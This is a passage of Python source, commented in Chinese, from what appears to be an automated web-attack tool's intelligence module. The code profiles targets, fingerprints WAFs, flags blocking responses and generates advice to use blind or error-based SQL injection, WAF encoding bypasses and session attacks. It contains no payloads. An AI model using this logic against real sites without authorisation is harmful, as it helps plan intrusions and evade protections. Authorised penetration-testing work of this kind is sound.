                        if err_type not in error_types:
                            error_types.append(err_type)
        
        return {
            "errors_found": errors_found,
            "unique_error_types": error_types,
            "error_count": len(errors_found),
        }
    
    def _analyze_status_codes(self, responses: List[Dict]) -> Dict[str, Any]:
        """分析状态码分布"""
        from collections import Counter
        
        statuses = [r.get("status_code", 0) for r in responses]
        status_counts = Counter(statuses)
        total = len(statuses)
        
        blocking_statuses = [403, 406, 429, 503]
        blocking_count = sum(status_counts.get(s, 0) for s in blocking_statuses)
        
        return {
            "distribution": dict(status_counts.most_common(5)),
            "blocking_rate": round(blocking_count / max(total, 1), 3),
            "error_rate": round(sum(status_counts.get(s, 0) for s in range(400, 600)) / max(total, 1), 3),
        }
    
    def _analyze_content_length(self, responses: List[Dict]) -> Dict[str, Any]:
        """分析内容长度"""
        lengths = [r.get("content_length", 0) for r in responses]
        
        if not lengths:
            return {}
        
        avg_len = sum(lengths) / len(lengths)
        
        # 检测异常短响应（可能是错误页面或拦截）
        short_responses = [
            i for i, l in enumerate(lengths) 
            if l < avg_len * 0.3 and l < 500
        ]
        
        return {
            "average_length": round(avg_len, 2),
            "short_response_indices": short_responses[:5],
            "short_response_count": len(short_responses),
        }
    
    def _generate_behavior_recommendations(self, analysis: Dict) -> List[str]:
        """基于行为分析生成建议"""
        recommendations = []
        
        patterns = analysis.get("behavioral_patterns", [])
        
        if "time_based_blind" in patterns:
            recommendations.append("检测到时间异常，建议使用时间盲注技术进行验证")
        
        if "error_based" in patterns:
            recommendations.append("发现错误信息泄露，可利用基于错误的注入技术")
        
        if "waf_detection" in patterns:
            recommendations.append("检测到WAF/防护系统，建议使用编码绕过技术")
        
        timing = analysis.get("timing_analysis", {})
        if timing.get("anomaly_count", 0) > 3:
            recommendations.append("多个请求出现时间异常，高度疑似存在时间盲注漏洞")
        
        errors = analysis.get("error_analysis", {})
        if errors.get("error_count", 0) > 5:
            recommendations.append("大量错误信息泄露，目标安全性较低")
        
        if not recommendations:
            recommendations.append("未检测到明显的行为异常，目标可能具有较好的安全防护")
        
        return recommendations


class IntelligenceModule:
    """
    情报模块主类
    
    整合所有情报能力，提供统一接口。
    """
    
    def __init__(self):
        self.target_modeler = TargetModeler()
        self.waf_fingerprinter = AdvancedWAFFingerprinter()
        self.behavior_analyzer = BehaviorAnalyzer()
        
        self.models_built = 0
        self.waf_fingerprints = 0
        self.behavior_analyses = 0
    
    async def full_intelligence_analysis(self,
                                          target: str,
                                          client: httpx.AsyncClient,
                                          recon_result=None) -> Dict[str, Any]:
        """
        执行完整的情报分析
        
        Args:
            target: 目标URL
            client: HTTP客户端
            recon_result: 可选的侦察结果
            
        Returns:
            完整的情报报告
        """
        report = {
            "analysis_id": str(int(time.time()))[-6:],
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "target_model": None,
            "waf_intelligence": None,
            "behavior_analysis": None,
            "overall_assessment": {},
        }
        
        logger.info("\n 开始完整情报分析...")
        
        # 1. 目标建模
        if recon_result:
            logger.info(" [1/3] 构建目标模型...")
            target_model = self.target_modeler.build_model(recon_result)
            report["target_model"] = target_model.to_dict()
            self.models_built += 1
        
        # 2. WAF指纹识别
        logger.info(" [2/3] WAF指纹识别...")
        waf_fp = await self.waf_fingerprinter.fingerprint_waf(target, client)
        report["waf_intelligence"] = waf_fp.to_dict()
        self.waf_fingerprints += 1
        
        # 3. 行为分析（如果有历史请求数据）
        if recon_result and hasattr(recon_result, 'entry_points'):
            logger.info(" [3/3] 行为模式分析...")
            # 这里可以添加实际的行为分析逻辑
            behavior_report = {"message": "行为分析需要更多请求数据"}
            report["behavior_analysis"] = behavior_report
            self.behavior_analyses += 1
        
        # 4. 综合评估
        report["overall_assessment"] = self._generate_overall_assessment(report)
        
        logger.info(" 情报分析完成\n")
        
        return report
    
    def _generate_overall_assessment(self, report: Dict) -> Dict[str, Any]:
        """生成综合评估"""
        assessment = {
            "risk_summary": "unknown",
            "recommended_approach": [],
            "key_findings": [],
            "caution_notes": [],
        }
        
        target_model = report.get("target_model", {})
        waf_info = report.get("waf_intelligence", {})
        
        # 风险摘要
        risk_score = target_model.get("assessment", {}).get("overall_risk_score", 5)
        if risk_score >= 7:
            assessment["risk_summary"] = "high_risk_target"
            assessment["recommended_approach"].append("使用激进策略，优先测试高危漏洞类型")
        elif risk_score >= 4:
            assessment["risk_summary"] = "medium_risk_target"
            assessment["recommended_approach"].append("使用平衡策略，系统性覆盖各攻击面")
        else:
            assessment["risk_summary"] = "low_risk_target"
            assessment["recommended_approach"].append("使用谨慎策略，深入挖掘每个发现的线索")
        
        # 关键发现
        findings = []
        
        if target_model.get("protection", {}).get("waf_present"):
            findings.append(f"检测到WAF: {target_model['protection'].get('waf_type', 'Unknown')}")
        
        if target_model.get("architecture", {}).get("load_balanced"):
            findings.append("目标使用负载均衡，可能影响状态性攻击")
        
        missing_headers = target_model.get("protection", {}).get("missing_security_headers", [])
        if missing_headers:
            findings.append(f"缺少{len(missing_headers)}个重要安全头")
        
        high_risk = target_model.get("vulnerabilities", {}).get("high_risk_areas", [])
        if high_risk:
            findings.append(f"识别出{len(high_risk)}个高风险区域")
        
        assessment["key_findings"] = findings[:5]
        
        # 注意事项
        cautions = []
        
        bypass_diff = waf_info.get("bypass_difficulty", "")
        if bypass_diff in ["difficult", "very_difficult", "impossible"]:
            cautions.append("WAF绕过困难，需要高级技术和耐心")
        
        if target_model.get("vulnerabilities", {}).get("potential_count", 0) > 5:
            cautions.append("潜在弱点较多，建议分优先级逐个验证")
        
        auth_weaknesses = target_model.get("auth_mechanisms", [])
        if auth_weaknesses:
            cautions.append("认证机制存在弱点，可能适合会话攻击")
        
        assessment["caution_notes"] = cautions[:3]
        
        return assessment
    
    def get_statistics(self) -> Dict[str, Any]:
        """获取模块统计"""
        return {
            "models_built": self.models_built,
            "waf_fingerprints": self.waf_fingerprints,
            "behavior_analyses": self.behavior_analyses,
        }


def create_intelligence_module() -> IntelligenceModule:
    """创建IntelligenceModule实例的便捷函数"""
    return IntelligenceModule()
